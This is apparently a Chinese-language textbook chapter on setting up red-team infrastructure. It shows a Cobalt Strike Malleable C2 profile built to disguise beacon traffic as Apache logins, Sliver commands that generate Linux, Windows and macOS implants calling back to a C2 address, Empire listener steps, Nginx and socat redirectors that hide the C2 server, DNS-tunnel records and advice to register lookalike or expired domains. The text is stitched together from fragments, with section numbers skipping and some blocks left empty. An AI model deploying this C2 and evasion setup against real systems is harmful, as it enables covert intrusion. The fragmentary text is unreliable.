# 第12章 红队演练环境搭建

## 12.1 红队演练概述

### 12.1.1 红队演练的定义

红队演练（Red Team Operations）是一种全面的安全评估方法，通过模拟真实攻击者的行为，全面评估组织的安全防护能力。与普通的渗透测试相比，红队演练更注重于评估整个组织的安全运营和响应能力。

### 12.1.2 红队演练的目标

1. **技术层面**：发现系统和应用的安全漏洞
2. **流程层面**：评估安全运营和事件响应流程
3. **人员层面**：测试员工的安全意识和防范能力
4. **物理层面**：评估物理安全措施

### 12.1.3 红队演练的特点

- **全面性**：覆盖技术、流程、人员等多个层面
- **实战性**：模拟真实的攻击场景
- **对抗性**：与蓝队进行对抗
- **目标导向**：以达成特定目标为导向

### 12.1.4 红队演练的阶段

1. **侦察阶段**：收集目标信息
2. **突破阶段**：获取初始访问
3. **内网漫游**：横向移动和权限提升
4. **达成目标**：完成演练目标
5. **痕迹清理**：清理攻击痕迹

### 12.2.9 Malleable C2 配置文件

Malleable C2是Cobalt Strike的重要功能，允许自定义C2通信特征，以躲避检测。

#### 基本配置

```bash
# 操作位置：Cobalt Strike配置文件
# 创建自定义C2配置文件
nano myprofile.c2

# 示例：模拟正常的Apache流量
http-config {
    set sample_header "Server: Apache/2.4.6 (CentOS)";
    set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS 9.1.660.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2635.43 Safari/537.36";
}

http-get {
    set uri "/api/login";
    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        metadata {
            base64;
            header "Cookie";
        }
    }
    server {
        header "Server" "Apache/2.4.6";
        header "X-Powered-By" "ASP.NET";
        output {
            base64;
            prepend "<!DOCTYPE html><html><head><title>Login</title></head><body>";
            append "</body></html>";
        }
    }
}

http-post {
    set uri "/api/submit";
    client {
        header "Accept" "*/*";
        id {
            base64;
            header "X-Request-ID";
        }
        output {
            base64;
            print;
        }
    }
    server {
        header "Server" "Apache/2.4.6";
        output {
            base64;
            print;
        }
    }
}
```

#### 使用自定义Profile

```bash
# 操作位置：终端
# 启动Team Server时指定profile
sudo ./teamserver 192.168.1.10 'Str0ngP@ssw0rd!' myprofile.c2
```

### 12.2.10 常见问题

**问题1：Team Server启动失败**

```
可能原因：
- 端口50050被占用
- Java未安装或版本不对
- 内存不足

解决方法：
1. 检查端口占用：lsof -i:50050
2. 确认Java安装：java -version
3. 增加内存：./teamserver 192.168.1.10 password 99999
```

**问题2：客户端连接不上**

```
可能原因：
- 网络不通
- 密码错误
- 防火墙阻止

解决方法：
1. 检查网络连接
2. 确认密码正确
3. 检查防火墙设置
```

### 12.3.2 安装 Empire

```bash
# 操作位置：终端

cd Empire
```

### 12.3.3 基本使用

```bash

(Empire) > listeners

# 配置监听器

(Empire: listeners/http) > execute

(Empire: listeners) > agents

(Empire: agents/launcher_bat) > set Listener test
```

## 12.5 Sliver 部署与使用

### 12.5.1 Sliver 简介

Sliver是一个开源的跨平台C2框架，由Bishop Fox开发，支持多协议、高度可定制。

**GitHub**：https://github.com/BishopFox/sliver

**特点**：
- 开源免费
- 跨平台（Windows、Linux、macOS）
- 支持多协议（HTTP、HTTPS、DNS等）
- 支持MTLS和WireGuard
- 可扩展性强

### 12.5.2 安装 Sliver

#### 【通用】下载二进制文件

```bash
# 操作位置：终端
# 下载最新版本
wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux-amd64.zip
unzip sliver-server_linux-amd64.zip
chmod +x sliver-server
sudo mv sliver-server /usr/local/bin/

# 验证安装
sliver-server --version
# 预期输出：Sliver v1.5.34
```

#### 【Windows环境】下载二进制文件

```bash
# 操作位置：浏览器
# 访问 https://github.com/BishopFox/sliver/releases
# 下载 sliver-server_windows_amd64.exe
```

### 12.5.3 基本使用

#### 1. 启动服务器

```bash
# 操作位置：终端
# 启动Sliver服务器
sliver-server

# 在服务器中创建监听器
sliver > listeners
sliver > https -l 443
```

#### 2. 生成Payload

```bash
# 操作位置：Sliver终端
# 生成Linux Payload
sliver > generate --os linux --arch amd64 --format executable --http https://192.168.1.10 --save /tmp

# 生成Windows Payload
sliver > generate --os windows --arch amd64 --format exe --http https://192.168.1.10 --save C:\payloads

# 生成macOS Payload
sliver > generate --os darwin --arch amd64 --format macho --http https://192.168.1.10
```

#### 3. 客户端连接

```bash
# 操作位置：终端
# 下载客户端
wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-client_linux-amd64.zip
unzip sliver-client_linux-amd64.zip

# 连接服务器
./sliver-client connect 192.168.1.10
# 输入启动时生成的挑战/响应凭据
```

### 12.5.4 常见问题

```

解决方法：
```

## 12.9 基础设施配置

### 12.9.1 红队基础设施架构

典型的红队基础设施架构：

```
攻击者终端
    |
    +-- C2服务器（Team Server/Cobalt Strike）
    |       |
    |       +-- 重定向器（Redirectors）
    |               |
    |               +-- 目标网络
    |
    +-- 钓鱼服务器（Gophish/SET）
    |
    +-- 文档收集服务器
```

### 12.9.2 重定向器配置

重定向器（Redirector）用于隐藏真实的C2服务器IP，增加红队的生存能力。

#### Nginx重定向器配置

```bash
# 操作位置：终端
# 安装Nginx
sudo apt install -y nginx

# 配置Nginx
sudo nano /etc/nginx/sites-available/redirector

# 添加配置
server {
    listen 80;
    server_name redirector.example.com;

    location / {
        proxy_pass http://c2-server:80;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}

# 启用配置
sudo ln -s /etc/nginx/sites-available/redirector /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl reload nginx
```

#### SOCAT重定向器

```bash
# 操作位置：终端
# 安装socat
sudo apt install -y socat

# 创建systemd服务
sudo nano /etc/systemd/system/redirector.service

[Unit]
Description=Socat Redirector
After=network.target

[Service]
ExecStart=/usr/bin/socat TCP-LISTEN:80,fork TCP:c2-server:80
Restart=always

[Install]
WantedBy=multi-user.target

# 启动服务
sudo systemctl enable redirector
sudo systemctl start redirector
```

### 12.9.3 域名配置

#### DNS记录配置

```bash
# A记录：指向C2服务器
c2.example.com    A    192.168.1.10

# NS记录：用于DNS隧道
ns1.example.com    NS   c2.example.com
```

#### 域名推荐

建议使用：
- 申请与目标相似的域名
- 使用过期域名（容易被信任）
- 使用合法网站的子域名（如果可行）

### 12.9.4 证书配置

#### Let's Encrypt证书

```bash
# 操作位置：终端
# 安装Certbot
sudo apt install -y certbot python3-certbot-nginx

# 申请证书
sudo certbot certonly --nginx -d c2.example.com

# 查看证书
sudo ls /etc/letsencrypt/live/c2.example.com/
```

#### 自签名证书

```bash
# 操作位置：终端
# 生成私钥
openssl genrsa -out ca.key 4096

# 生成证书
openssl req -new -x509 -days 365 -key ca.key -out ca.crt

# 转换格式
openssl pkcs12 -export -in ca.crt -inkey ca.key -out c2.p12
```
